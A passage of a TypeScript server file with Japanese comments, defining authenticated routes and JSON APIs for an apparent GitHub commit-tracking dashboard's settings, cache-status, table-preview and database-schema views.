    scopesError = 'GitHub OAuth 設定が不足しています';
  }

  return c.html(getSettingsPage({
    username: user.sub,
    name: user.name,
    email: user.email,
    issuedAt,
    expiresAt,
    expiresAtTimestamp: user.exp,
    timezone: resolvedTimezone,
    sessionDuration,
    recentCommitsCount,
    toastDuration,
    statusCommitCacheSortMode,
    statusChartMode,
    statusChartSortOrder,
    statusTableAutoDetect,
    statusShowAutoDetectedTables,
    statusIgnoreUnknownUnclassifiedWarning,
    searchLabelMode,
    githubScopes: GITHUB_OAUTH_SCOPE,
    githubGrantedScopes: grantedScopes,
    githubScopeError: scopesError,
  }));
});

/**
 * ユーザー情報ページ（認証が必要）
 */
app.get('/userinfo', authMiddleware, async (c) => {
  const user = c.get('user');

  return c.html(getUserInfoPage({
    username: user.sub,
    name: user.name,
    email: user.email,
    githubId: user.github_id,
  }));
});

/**
 * キャッシュ状況ページ（認証が必要）
 */
app.get('/status', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  const cookieHeader = c.req.header('Cookie');
  const cookieVals = getCookieValues(cookieHeader, [
    'user_status_commit_cache_sort_mode',
    'user_status_commit_cache_sort_state',
    'user_status_chart_mode',
    'user_status_chart_sort_order',
    'user_status_table_autodetect',
    'user_status_show_autodetected_tables',
    'user_status_ignore_unknown_unclassified_warning',
  ]);
  const statusCommitCacheSortMode = cookieVals['user_status_commit_cache_sort_mode'] === 'toggle' ? 'toggle' : 'off';
  const statusCommitCacheSortState = statusCommitCacheSortMode === 'toggle' && cookieVals['user_status_commit_cache_sort_state'] === 'commit_month_desc'
    ? 'commit_month_desc'
    : 'cached_at_desc';
  const statusChartMode = cookieVals['user_status_chart_mode'] === 'repo' ? 'repo' : 'gradient';
  const statusChartSortOrder = cookieVals['user_status_chart_sort_order'] === 'date' ? 'date' : 'count';
  const statusTableAutoDetect = cookieVals['user_status_table_autodetect'] === 'off' ? 'off' : 'on';
  const statusShowAutoDetectedTables = cookieVals['user_status_show_autodetected_tables'] === 'on' ? 'on' : 'off';
  const statusIgnoreUnknownUnclassifiedWarning = cookieVals['user_status_ignore_unknown_unclassified_warning'] === 'off' ? 'off' : 'on';
  const userSession = await getUserSession(c.env.DB, user.sub);
  const timezone = userSession?.timezone || getCookieValues(cookieHeader, ['user_timezone'])['user_timezone'] || DEFAULT_TIMEZONE;

  const data: CacheStatusData = {
    commitCache: { totalEntries: 0, totalCommits: 0, repos: [], byMonth: [], byMonthByRepo: [], entries: [] },
    repoColors: [],
    repoGroups: [],
    installationPerms: { totalEntries: 0, entries: [] },
    cacheStats: {
      totalGithubFetch: 0, totalCacheSave: 0,
      totalCacheLookup: 0, totalCacheHit: 0,
      entries: [],
    },
    tables: [],
    tableGroupMap: TABLE_GROUP_MAP,
    unclassifiedAutoDetectedTables: [],
    groupLabels: GROUP_LABELS,
    groupColors: GROUP_COLORS,
    tableFkPairs: Object.entries(COLUMN_FK_TARGETS).flatMap(
      ([from, cols]) => Object.values(cols).map(to => [from, to] as [string, string])
    ),
    userContext: {
      teamName: null, teamId: null,
      workspaceName: null, workspaceId: null,
      role: null,
      allWorkspaces: [],
    },
  };

  if (db) {
    // ワークスペース情報を取得
    const wsInfo = await getCurrentWorkspace(db, user.sub);
    const workspaceId = wsInfo?.workspaceId ?? '';

    // ユーザーコンテキスト情報を構築
    data.userContext.teamName = wsInfo?.teamName ?? null;
    data.userContext.teamId = wsInfo?.teamId ?? null;
    data.userContext.workspaceName = wsInfo?.workspaceName ?? null;
    data.userContext.workspaceId = wsInfo?.workspaceId ?? null;
    data.userContext.allWorkspaces = await getUserWorkspaces(db, user.sub);

    // ロール取得
    if (wsInfo?.teamId) {
      try {
        const roleRow = await db.prepare(
          'SELECT role FROM team_members WHERE team_id = ? AND user_id = ?'
        ).bind(wsInfo.teamId, user.sub).first<{ role: string }>();
        data.userContext.role = roleRow?.role ?? null;
      } catch {
        // ignore
      }
    }

    // テーブル別マイグレーション状況を収集
    let appliedMigrationNames: string[] = [];
    try {
      const migrationRows = await db.prepare('SELECT name FROM d1_migrations ORDER BY id DESC').all<{ name: string }>();
      appliedMigrationNames = (migrationRows.results ?? []).map((row) => row.name).filter((v): v is string => typeof v === 'string');
    } catch {
      // d1_migrations が存在しない環境は無視
    }

    // 新テーブルを table_catalog へ自動登録（マイグレーション実行後の初回 /status ロードで反映）
    try {
      await autoRegisterTablesFromSqliteMaster(db, appliedMigrationNames);
    } catch {
      // table_catalog が存在しない等の場合は無視
    }

    // table_catalog を一次情報源としてテーブル一覧を取得（フォールバック: ハードコード定数）
    let effectiveTableDefs: Array<{ name: string; migration: string; description: string; syncPolicy: string }>;
    try {
      const catalogRows = await db.prepare(
        'SELECT table_name, migration, description, sync_policy FROM table_catalog ORDER BY display_order ASC, table_name ASC'
      ).all<{ table_name: string; migration: string; description: string; sync_policy: string }>();
      effectiveTableDefs = (catalogRows.results ?? []).map((r) => ({
        name: r.table_name,
        migration: r.migration,
        description: r.description,
        syncPolicy: r.sync_policy,
      }));
      if (effectiveTableDefs.length === 0) throw new Error('empty catalog');
    } catch {
      effectiveTableDefs = getEffectiveStatusTableDefinitions().map((d) => ({
        name: d.name,
        migration: d.migration,
        description: d.description,
        syncPolicy: d.syncPolicy,
      }));
    }

    const knownTables = new Set<string>();
    for (const tbl of effectiveTableDefs) {
      knownTables.add(tbl.name);
      const entry: TableStatusEntry = {
        name: tbl.name,
        exists: false,
        rowCount: null,
        migration: tbl.migration,
        description: tbl.description,
        syncPolicy: tbl.syncPolicy,
      };
      try {
        const countResult = await db.prepare(
          `SELECT COUNT(*) AS cnt FROM ${tbl.name}`
        ).first<{ cnt: number }>();
        entry.exists = true;
        entry.rowCount = countResult?.cnt ?? 0;
      } catch {
        // テーブルが存在しない場合 → exists = false のまま
      }
      data.tables.push(entry);
    }

    // 追加テーブル（定義外）も自動検出して表示する
    if (statusTableAutoDetect === 'on') {
      try {
        const sqliteTables = await db.prepare(
          "SELECT name FROM sqlite_master WHERE type = 'table' AND name NOT LIKE 'sqlite_%'"
        ).all<{ name: string }>();
        for (const row of sqliteTables.results ?? []) {
          if (!row.name || knownTables.has(row.name) || row.name === 'd1_migrations') continue;
          const inferredMigration = inferMigrationFromAppliedNames(row.name, appliedMigrationNames) ?? 'unknown';
          let rowCount: number | null = null;
          try {
            const countResult = await db.prepare(`SELECT COUNT(*) AS cnt FROM ${row.name}`).first<{ cnt: number }>();
            rowCount = countResult?.cnt ?? 0;
          } catch {
            rowCount = null;
          }
          data.tables.push({
            name: row.name,
            exists: true,
            rowCount,
            migration: inferredMigration,
            description: '自動検出テーブル',
            syncPolicy: 'manual',
            isAutoDetected: true,
          });
        }
      } catch {
        // sqlite_master が参照できない環境は無視
      }
    }

    if (statusShowAutoDetectedTables !== 'on') {
      data.tables = data.tables.filter((table) => !table.isAutoDetected);
    }

    // 競合解消や表示差分があっても 0025(commit_agent_log) が /status 一覧から消えないよう補完
    if (!data.tables.some((table) => table.name === 'commit_agent_log')) {
      let rowCount: number | null = null;
      let exists = false;
      try {
        const countResult = await db.prepare('SELECT COUNT(*) AS cnt FROM commit_agent_log').first<{ cnt: number }>();
        exists = true;
        rowCount = countResult?.cnt ?? 0;
      } catch {
        exists = false;
        rowCount = null;
      }
      data.tables.push({
        name: 'commit_agent_log',
        exists,
        rowCount,
        migration: '0025',
        description: 'コミットエージェント検出ログ',
        syncPolicy: 'auto',
      });
    }

    // コミットキャッシュ
    try {
      const cacheRows = await db.prepare(
        'SELECT owner, repo, year, month, counts, cached_at FROM commit_calendar_cache WHERE workspace_id = ? ORDER BY cached_at DESC, year DESC, month DESC'
      ).bind(workspaceId).all<{ owner: string; repo: string; year: number; month: number; counts: string; cached_at: string }>();

      if (cacheRows.results) {
        const repoMap = new Map<string, { entryCount: number; totalCommits: number }>();
        const monthMap = new Map<string, { entryCount: number; totalCommits: number }>();
        const monthRepoMap = new Map<string, number>();

        for (const row of cacheRows.results) {
          const counts: Record<string, number> = JSON.parse(row.counts);
          const total = Object.values(counts).reduce((s, v) => s + v, 0);

          data.commitCache.entries.push({
            owner: row.owner,
            repo: row.repo,
            year: row.year,
            month: row.month,
            totalCommits: total,
            cachedAt: formatTimestampWithTimezone(new Date(row.cached_at), timezone),
          });
          data.commitCache.totalCommits += total;

          const repoKey = `${row.owner}/${row.repo}`;
          const ym = `${row.year}-${String(row.month).padStart(2, '0')}`;
          const mrKey = `${ym}::${repoKey}`;
          monthRepoMap.set(mrKey, (monthRepoMap.get(mrKey) || 0) + total);
          const existing = repoMap.get(repoKey) || { entryCount: 0, totalCommits: 0 };
          existing.entryCount++;
          existing.totalCommits += total;
          repoMap.set(repoKey, existing);

          const mExisting = monthMap.get(ym) || { entryCount: 0, totalCommits: 0 };
          mExisting.entryCount++;
          mExisting.totalCommits += total;
          monthMap.set(ym, mExisting);
        }

        data.commitCache.totalEntries = cacheRows.results.length;

        for (const [key, val] of repoMap.entries()) {
          const [owner, repo] = key.split('/');
          data.commitCache.repos.push({ owner, repo, entryCount: val.entryCount, totalCommits: val.totalCommits });
        }
        data.commitCache.repos.sort((a, b) => b.totalCommits - a.totalCommits);

        for (const [ym, val] of monthMap.entries()) {
          data.commitCache.byMonth.push({ yearMonth: ym, entryCount: val.entryCount, totalCommits: val.totalCommits });
        }
        data.commitCache.byMonth.sort((a, b) => a.yearMonth.localeCompare(b.yearMonth));

        for (const [mrKey, commits] of monthRepoMap.entries()) {
          const [ym, repo] = mrKey.split('::');
          data.commitCache.byMonthByRepo.push({ yearMonth: ym, repo, commits });
        }
      }
    } catch (error) {
      logger.warn('Failed to fetch commit calendar cache for status page', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }

    // 当月分を commit_list_cache から集計して統計に含める
    // （commit_calendar_cache には過去月のみ保存されるため当月分が欠落する）
    try {
      const currentYm = getJstYearMonthParts(new Date());
      const currentYmPrefix = `${currentYm.year}-${String(currentYm.month).padStart(2, '0')}`;

      const currentMonthRows = await db.prepare(
        'SELECT owner, repo, date, commit_count FROM commit_list_cache WHERE workspace_id = ? AND date LIKE ? ORDER BY owner, repo, date'
      ).bind(workspaceId, `${currentYmPrefix}-%`).all<{
        owner: string; repo: string; date: string; commit_count: number;
      }>();

      if (currentMonthRows.results && currentMonthRows.results.length > 0) {
        const currentMonthRepoMap = new Map<string, { owner: string; repo: string; totalCommits: number; latestDate: string }>();
        let currentMonthTotalCommits = 0;

        for (const row of currentMonthRows.results) {
          currentMonthTotalCommits += row.commit_count;
          const repoKey = `${row.owner}/${row.repo}`;
          const existing = currentMonthRepoMap.get(repoKey);
          if (existing) {
            existing.totalCommits += row.commit_count;
            if (row.date > existing.latestDate) existing.latestDate = row.date;
          } else {
            currentMonthRepoMap.set(repoKey, {
              owner: row.owner,
              repo: row.repo,
              totalCommits: row.commit_count,
              latestDate: row.date,
            });
          }
        }

        for (const [, val] of currentMonthRepoMap.entries()) {
          data.commitCache.entries.push({
            owner: val.owner,
            repo: val.repo,
            year: currentYm.year,
            month: currentYm.month,
            totalCommits: val.totalCommits,
            cachedAt: formatTimestampWithTimezone(new Date(val.latestDate + 'T00:00:00Z'), timezone) + ' (当月)',
          });
          data.commitCache.totalCommits += val.totalCommits;

          const repoEntry = data.commitCache.repos.find(
            r => r.owner === val.owner && r.repo === val.repo
          );
          if (repoEntry) {
            repoEntry.entryCount++;
            repoEntry.totalCommits += val.totalCommits;
          } else {
            data.commitCache.repos.push({
              owner: val.owner,
              repo: val.repo,
              entryCount: 1,
              totalCommits: val.totalCommits,
            });
          }
        }

        data.commitCache.totalEntries += currentMonthRepoMap.size;
        data.commitCache.repos.sort((a, b) => b.totalCommits - a.totalCommits);

        const existingMonth = data.commitCache.byMonth.find(m => m.yearMonth === currentYmPrefix);
        if (existingMonth) {
          existingMonth.entryCount += currentMonthRepoMap.size;
          existingMonth.totalCommits += currentMonthTotalCommits;
        } else {
          data.commitCache.byMonth.push({
            yearMonth: currentYmPrefix,
            entryCount: currentMonthRepoMap.size,
            totalCommits: currentMonthTotalCommits,
          });
        }
        data.commitCache.byMonth.sort((a, b) => a.yearMonth.localeCompare(b.yearMonth));

        for (const [repoKey, val] of currentMonthRepoMap.entries()) {
          data.commitCache.byMonthByRepo.push({
            yearMonth: currentYmPrefix,
            repo: repoKey,
            commits: val.totalCommits,
          });
        }
      }
    } catch (error) {
      logger.warn('Failed to fetch current month commit data for status page', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }

    // インストール権限キャッシュ
    try {
      const permRows = await db.prepare(
        'SELECT installation_id, repo_name, repository_selection, permissions, updated_at FROM installation_permissions ORDER BY updated_at DESC'
      ).all<{ installation_id: number; repo_name: string | null; repository_selection: string; permissions: string; updated_at: string }>();

      if (permRows.results) {
        data.installationPerms.totalEntries = permRows.results.length;
        for (const row of permRows.results) {
          const perms: Record<string, string> = JSON.parse(row.permissions);
          data.installationPerms.entries.push({
            installationId: row.installation_id,
            repoName: row.repo_name,
            repositorySelection: row.repository_selection,
            permissionCount: Object.keys(perms).length,
            updatedAt: formatTimestampWithTimezone(new Date(row.updated_at), timezone),
          });
        }
      }
    } catch (error) {
      logger.warn('Failed to fetch installation permissions for status page', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }

    // キャッシュ統計（ユーザー別）
    try {
      const statsRows = await db.prepare(
        'SELECT owner, repo, github_fetch_count, cache_save_count, cache_lookup_count, cache_hit_count, last_updated_at FROM cache_stats WHERE user_id = ? ORDER BY last_updated_at DESC'
      ).bind(user.sub).all<{
        owner: string; repo: string;
        github_fetch_count: number; cache_save_count: number;
        cache_lookup_count: number; cache_hit_count: number;
        last_updated_at: string;
      }>();

      if (statsRows.results) {
        for (const row of statsRows.results) {
          data.cacheStats.entries.push({
            owner: row.owner,
            repo: row.repo,
            githubFetchCount: row.github_fetch_count,
            cacheSaveCount: row.cache_save_count,
            cacheLookupCount: row.cache_lookup_count,
            cacheHitCount: row.cache_hit_count,
            lastUpdatedAt: formatTimestampWithTimezone(new Date(row.last_updated_at), timezone),
          });
          data.cacheStats.totalGithubFetch += row.github_fetch_count;
          data.cacheStats.totalCacheSave += row.cache_save_count;
          data.cacheStats.totalCacheLookup += row.cache_lookup_count;
          data.cacheStats.totalCacheHit += row.cache_hit_count;
        }
      }
    } catch (error) {
      logger.warn('Failed to fetch cache stats for status page', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }

    // リポジトリ色設定の読み込み（syncPolicy: auto — ページ読み込み時に自動同期）
    try {
      // まず既存データを読む
      const colorRows = await db.prepare(
        'SELECT repo_name, color_code, display_order, tags, is_visible FROM repo_color_settings WHERE workspace_id = ? ORDER BY display_order ASC, repo_name ASC'
      ).bind(workspaceId).all<{
        repo_name: string; color_code: string; display_order: number; tags: string; is_visible: number;
      }>();

      const existingRepoNames = new Set<string>();
      if (colorRows.results) {
        for (const row of colorRows.results) {
          existingRepoNames.add(row.repo_name);
          data.repoColors.push({
            repoName: row.repo_name,
            colorCode: row.color_code,
            displayOrder: row.display_order,
            tags: row.tags,
            isVisible: row.is_visible === 1,
          });
        }
      }

      // コミットキャッシュに存在するが色設定に未登録のリポジトリを自動追加
      const cacheRepoRows = await db.prepare(
        'SELECT DISTINCT owner, repo FROM commit_calendar_cache WHERE workspace_id = ?'
      ).bind(workspaceId).all<{ owner: string; repo: string }>();
      const listRepoRows = await db.prepare(
        'SELECT DISTINCT owner, repo FROM commit_list_cache WHERE workspace_id = ?'
      ).bind(workspaceId).all<{ owner: string; repo: string }>();

      const allCacheRepos = new Set<string>();
      if (cacheRepoRows.results) {
        for (const r of cacheRepoRows.results) allCacheRepos.add(`${r.owner}/${r.repo}`);
      }
      if (listRepoRows.results) {
        for (const r of listRepoRows.results) allCacheRepos.add(`${r.owner}/${r.repo}`);
      }

      const newRepos = Array.from(allCacheRepos).filter(r => !existingRepoNames.has(r)).sort();
      if (newRepos.length > 0) {
        const defaultPalette = [
          '#667eea', '#e53e3e', '#38a169', '#ed8936', '#9f7aea',
          '#dd6b20', '#319795', '#d53f8c', '#3182ce', '#d69e2e',
          '#805ad5', '#2b6cb0', '#c53030', '#2f855a', '#b7791f',
        ];
        let maxOrder = -1;
        if (existingRepoNames.size > 0) {
          const orderRow = await db.prepare(
            'SELECT MAX(display_order) AS max_order FROM repo_color_settings WHERE workspace_id = ?'
          ).bind(workspaceId).first<{ max_order: number | null }>();
          maxOrder = orderRow?.max_order ?? -1;
        }
        const now = new Date().toISOString();
        const stmts = newRepos.map((repo, i) => {
          const colorIndex = (existingRepoNames.size + i) % defaultPalette.length;
          const order = maxOrder + 1 + i;
          return db.prepare(
            'INSERT OR IGNORE INTO repo_color_settings (workspace_id, repo_name, color_code, display_order, tags, is_visible, created_at, updated_at) VALUES (?, ?, ?, ?, ?, 1, ?, ?)'
          ).bind(workspaceId, repo, defaultPalette[colorIndex], order, '', now, now);
        });
        await db.batch(stmts);

        // 新規追加分を data.repoColors にも反映
        for (let i = 0; i < newRepos.length; i++) {
          const colorIndex = (existingRepoNames.size + i) % defaultPalette.length;
          data.repoColors.push({
            repoName: newRepos[i],
            colorCode: defaultPalette[colorIndex],
            displayOrder: maxOrder + 1 + i,
            tags: '',
            isVisible: true,
          });
        }

        logger.info(`Auto-synced ${newRepos.length} repos to repo_color_settings on page load`, {
          userId: user.sub, workspaceId, newRepos,
        });
      }
    } catch (error) {
      logger.warn('Failed to read/sync repo_color_settings (table may not exist yet)', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }

    // リポジトリグループの読み込み
    try {
      const groupRows = await db.prepare(
        'SELECT id, name, description, color_code, icon, slack_channel_id, display_order FROM repo_groups WHERE workspace_id = ? ORDER BY display_order ASC, name ASC'
      ).bind(workspaceId).all<{
        id: string; name: string; description: string; color_code: string;
        icon: string; slack_channel_id: string; display_order: number;
      }>();

      if (groupRows.results && groupRows.results.length > 0) {
        const groupIds = groupRows.results.map(g => g.id);
        const memberRows = await db.prepare(
          `SELECT group_id, repo_name FROM repo_group_members WHERE workspace_id = ? AND group_id IN (${groupIds.map(() => '?').join(',')}) ORDER BY repo_name`
        ).bind(workspaceId, ...groupIds).all<{ group_id: string; repo_name: string }>();

        const memberMap = new Map<string, string[]>();
        if (memberRows.results) {
          for (const m of memberRows.results) {
            const list = memberMap.get(m.group_id) || [];
            list.push(m.repo_name);
            memberMap.set(m.group_id, list);
          }
        }

        for (const g of groupRows.results) {
          data.repoGroups.push({
            id: g.id,
            name: g.name,
            description: g.description,
            colorCode: g.color_code,
            icon: g.icon,
            slackChannelId: g.slack_channel_id,
            displayOrder: g.display_order,
            repos: memberMap.get(g.id) || [],
          });
        }
      }
    } catch (error) {
      logger.warn('Failed to load repo_groups (table may not exist yet)', {
        error: error instanceof Error ? error.message : 'Unknown error',
      });
    }
  }

  return c.html(getCacheStatusPage({
    username: user.sub,
    name: user.name,
    statusCommitCacheSortMode,
    statusCommitCacheSortState,
    statusChartMode,
    statusChartSortOrder,
    statusIgnoreUnknownUnclassifiedWarning,
  }, data));
});

app.get('/api/status/tables/:table/rows', authMiddleware, async (c) => {
  const user = c.get('user');
  const db = c.env.DB;
  const tableName = c.req.param('table');

  if (!db) {
    return jsonUtf8({ error: 'Table not found' }, 404);
  }

  // table_catalog を一次情報源として使用（フォールバック: ハードコード定数）
  let tableInfo: { migration: string; description: string; preview_sql: string | null } | null = null;
  try {
    const catalogRow = await db
      .prepare('SELECT migration, description, preview_sql FROM table_catalog WHERE table_name = ?')
      .bind(tableName)
      .first<{ migration: string; description: string; preview_sql: string | null }>();
    if (catalogRow) {
      tableInfo = { migration: catalogRow.migration, description: catalogRow.description, preview_sql: catalogRow.preview_sql ?? null };
    }
  } catch {
    // table_catalog が存在しない場合はフォールバックへ
  }
  if (!tableInfo) {
    const hardcoded = getStatusTableDefinition(tableName);
    if (!hardcoded) {
      return jsonUtf8({ error: 'Table not found' }, 404);
    }
    tableInfo = { migration: hardcoded.migration, description: hardcoded.description, preview_sql: null };
  }

  const wsInfo = await getCurrentWorkspace(db, user.sub);

  // preview_sql が DB に保存されていればテンプレート展開、なければ従来の switch 関数
  let previewQuery: { sql: string; params: (string | number)[] } | null;
  if (tableInfo.preview_sql) {
    previewQuery = buildPreviewQueryFromTemplate(
      tableInfo.preview_sql,
      user.sub,
      wsInfo?.workspaceId ?? null,
      wsInfo?.teamId ?? null,
    );
  } else {
    previewQuery = getStatusTablePreviewQuery(
      tableName,
      user.sub,
      wsInfo?.workspaceId ?? null,
      wsInfo?.teamId ?? null,
    );
  }

  if (!previewQuery) {
    return jsonUtf8({
      table: tableName,
      migration: tableInfo.migration,
      description: tableInfo.description,
      columns: [],
      columnKeyInfo: {},
      filterableColumns: [],
      rows: [],
      limit: STATUS_TABLE_PREVIEW_LIMIT,
    });
  }

  try {
    const columnsResult = await db.prepare(`PRAGMA table_info(${tableName})`).all<{ name: string }>();
    const pragmaColumns = (columnsResult.results ?? []).map((column) => column.name);
    const rowsResult = await db.prepare(previewQuery.sql).bind(...previewQuery.params).all<Record<string, unknown>>();
    const rows = rowsResult.results ?? [];
    const columns = mergeColumnsFromRows(pragmaColumns, rows);
    const columnKeyInfo: Record<string, string> = {};
    for (const col of columns) {
      const keyType = getColumnKeyType(tableName, col);
      if (keyType) columnKeyInfo[col] = keyType;
    }
    return jsonUtf8({
      table: tableName,
      migration: tableInfo.migration,
      description: tableInfo.description,
      columns,
      columnKeyInfo,
      filterableColumns: getFilterableColumns(tableName),
      rows,
      limit: STATUS_TABLE_PREVIEW_LIMIT,
    });
  } catch (error) {
    logger.warn('Failed to fetch status table preview', {
      tableName,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch table preview' }, 500);
  }
});

app.get('/api/status/tables/:table/ym-summary', authMiddleware, async (c) => {
  const db = c.env.DB;
  const tableName = c.req.param('table');
  const tableDefinition = getStatusTableDefinition(tableName);

  if (!db || !tableDefinition) {
    return jsonUtf8({ error: 'Table not found' }, 404);
  }

  try {
    const colsResult = await db.prepare(`PRAGMA table_info(${tableName})`).all<{ name: string }>();
    const cols = (colsResult.results ?? []).map((r) => r.name);
    if (!cols.includes('last_updated_at')) {
      return jsonUtf8({ ym: [] });
    }

    const rowsResult = await db
      .prepare(
        `SELECT strftime('%Y-%m', last_updated_at) as ym, COUNT(*) as cnt FROM ${tableName} WHERE last_updated_at IS NOT NULL GROUP BY ym ORDER BY cnt DESC`,
      )
      .all<{ ym: string; cnt: number }>();

    return jsonUtf8({ ym: rowsResult.results ?? [] });
  } catch (error) {
    logger.warn('Failed to fetch ym summary', {
      tableName,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch ym summary' }, 500);
  }
});

app.get('/api/status/tables/:table/calendar', authMiddleware, async (c) => {
  const db = c.env.DB;
  const tableName = c.req.param('table');
  const ym = c.req.query('ym');
  const tableDefinition = getStatusTableDefinition(tableName);

  if (!db || !tableDefinition) {
    return jsonUtf8({ error: 'Table not found' }, 404);
  }

  if (!ym || !/^\d{4}-\d{2}$/.test(ym)) {
    return jsonUtf8({ error: 'Invalid ym parameter' }, 400);
  }

  try {
    const rowsResult = await db
      .prepare(
        `SELECT strftime('%d', last_updated_at) as day, COUNT(*) as cnt FROM ${tableName} WHERE strftime('%Y-%m', last_updated_at) = ? AND last_updated_at IS NOT NULL GROUP BY day ORDER BY day`,
      )
      .bind(ym)
      .all<{ day: string; cnt: number }>();

    return jsonUtf8({ ym, days: rowsResult.results ?? [] });
  } catch (error) {
    logger.warn('Failed to fetch calendar data', {
      tableName,
      ym,
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch calendar data' }, 500);
  }
});

app.get('/api/status/migrations/:migration/sql', authMiddleware, async (c) => {
  const migration = c.req.param('migration');
  const sql = STATUS_MIGRATION_SQL[migration];

  if (!sql) {
    return jsonUtf8({ error: 'Migration not found' }, 404);
  }

  return jsonUtf8({ migration, sql });
});

app.get('/api/status/schema', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) {
    return jsonUtf8({ error: 'DB not available' }, 500);
  }

  try {
    const tablesResult = await db
      .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE '_cf_%' AND name NOT LIKE 'd1_%' ORDER BY name")
      .all<{ name: string }>();
    const tableNames = (tablesResult.results ?? []).map((r) => r.name);

    const tables: {
      name: string;
      cols: { name: string; type: string; keys: string[] }[];
    }[] = [];

    const relations: [string, string, string, string, string][] = [];
    const seenRelations = new Set<string>();

    for (const tName of tableNames) {
      const colsResult = await db
        .prepare(`PRAGMA table_info(${tName})`)
        .all<{ name: string; type: string; pk: number; notnull: number }>();
      const cols = (colsResult.results ?? []).map((col) => {
        const keys: string[] = [];
        if (col.pk > 0) keys.push('pk');
        return { name: col.name, type: col.type || 'TEXT', keys };
      });

      const indexResult = await db
        .prepare(`PRAGMA index_list(${tName})`)
        .all<{ name: string; unique: number }>();
      for (const idx of indexResult.results ?? []) {
        const indexInfoResult = await db
          .prepare(`PRAGMA index_info(${idx.name})`)
          .all<{ name: string }>();
        const indexCols = (indexInfoResult.results ?? []).map((r) => r.name);
        for (const c of cols) {
          if (indexCols.includes(c.name)) {
            if (idx.unique && !c.keys.includes('pk')) {
              if (!c.keys.includes('uk')) c.keys.push('uk');
            } else if (!idx.unique && !c.keys.includes('pk') && !c.keys.includes('uk')) {
              if (!c.keys.includes('idx')) c.keys.push('idx');
            }
          }
        }
      }

      const fkResult = await db
        .prepare(`PRAGMA foreign_key_list(${tName})`)
        .all<{ table: string; from: string; to: string }>();
      for (const fk of fkResult.results ?? []) {
        for (const c of cols) {
          if (c.name === fk.from && !c.keys.includes('fk')) {
            c.keys.push('fk');
          }
        }
        const relKey = `${tName}.${fk.from}->${fk.table}.${fk.to}`;
        if (!seenRelations.has(relKey)) {
          seenRelations.add(relKey);
          relations.push([tName, fk.from, fk.table, fk.to, '多:1']);
        }
      }

      tables.push({ name: tName, cols });
    }

    // 論理FK (COLUMN_FK_TARGETS) をマージ。DB制約のないカラム間参照もER図に破線で描画できるようにする。
    for (const [fromTable, colMap] of Object.entries(COLUMN_FK_TARGETS)) {
      for (const [fromCol, toTable] of Object.entries(colMap)) {
        const relKey = `${fromTable}.${fromCol}->${toTable}.__logical__`;
        if (seenRelations.has(relKey)) continue;
        // 既にDB-FKで同じ関係が登録されていれば重複させない
        const dbFkKeyPrefix = `${fromTable}.${fromCol}->${toTable}.`;
        let dupExists = false;
        for (const existing of seenRelations) {
          if (existing.startsWith(dbFkKeyPrefix)) {
            dupExists = true;
            break;
          }
        }
        if (dupExists) continue;
        seenRelations.add(relKey);
        const toCol = resolveLogicalFkTargetCol(fromTable, fromCol);
        relations.push([fromTable, fromCol, toTable, toCol, '論理FK']);
      }
    }

    return jsonUtf8({ tables, relations });
  } catch (error) {
    logger.warn('Failed to fetch schema', {
      error: error instanceof Error ? error.message : 'Unknown error',
    });
    return jsonUtf8({ error: 'Failed to fetch schema' }, 500);
  }
});

/**
 * カラム名別リレーション統計 HTML
 * 同名カラムがN個のテーブルに出現 → 最小N-1本の矢印が期待されるが、
 * 実際にER図に描かれている本数と比較する。
 */
/**
 * 共通: D1 からスキーマを読み出し、物理FKと論理FKを分けて返す。
 * 物理FKは PRAGMA foreign_key_list 由来、論理FKは COLUMN_FK_TARGETS 由来。
 */
async function loadSchemaRelations(db: D1Database): Promise<{
  tables: TableSchema[];
  physicalRelations: Relation[];
  logicalRelations: Relation[];
}> {
  const tablesResult = await db
    .prepare("SELECT name FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' AND name NOT LIKE '_cf_%' AND name NOT LIKE 'd1_%' ORDER BY name")
    .all<{ name: string }>();
  const tableNames = (tablesResult.results ?? []).map((r) => r.name);

  const tables: TableSchema[] = [];
  const physicalRelations: Relation[] = [];
  const seenPhysical = new Set<string>();

  for (const tName of tableNames) {
    const colsResult = await db
      .prepare(`PRAGMA table_info(${tName})`)
      .all<{ name: string; type: string }>();
    const cols = (colsResult.results ?? []).map((col) => ({
      name: col.name,
      type: col.type || 'TEXT',
      keys: [] as string[],
    }));

    const fkResult = await db
      .prepare(`PRAGMA foreign_key_list(${tName})`)
      .all<{ table: string; from: string; to: string }>();
    for (const fk of fkResult.results ?? []) {
      const relKey = `${tName}.${fk.from}->${fk.table}.${fk.to}`;
      if (!seenPhysical.has(relKey)) {
        seenPhysical.add(relKey);
        physicalRelations.push([tName, fk.from, fk.table, fk.to, '多:1']);
      }
    }

    tables.push({ name: tName, cols });
  }

  const logicalRelations: Relation[] = [];
  const seenLogical = new Set<string>();
  for (const [fromTable, colMap] of Object.entries(COLUMN_FK_TARGETS)) {
    for (const [fromCol, toTable] of Object.entries(colMap)) {
      // 物理FKに同じ関係があるなら論理FKとして追加しない
      const physPrefix = `${fromTable}.${fromCol}->${toTable}.`;
      let dup = false;
      for (const k of seenPhysical) {
        if (k.startsWith(physPrefix)) {
          dup = true;
          break;
        }
      }
      if (dup) continue;
      const k = `${fromTable}.${fromCol}->${toTable}`;
      if (seenLogical.has(k)) continue;
      seenLogical.add(k);
      const toCol = resolveLogicalFkTargetCol(fromTable, fromCol);
      logicalRelations.push([fromTable, fromCol, toTable, toCol, '論理FK']);
    }
  }

  return { tables, physicalRelations, logicalRelations };
}

app.get('/status/column-stats', authMiddleware, async (c) => {
  const db = c.env.DB;
  if (!db) {
    return new Response('DB not available', {
      status: 500,
      headers: { 'Content-Type': 'text/plain; charset=utf-8' },
    });
  }

  try {
    const { tables, physicalRelations, logicalRelations } = await loadSchemaRelations(db);
    const relations = [...physicalRelations, ...logicalRelations];
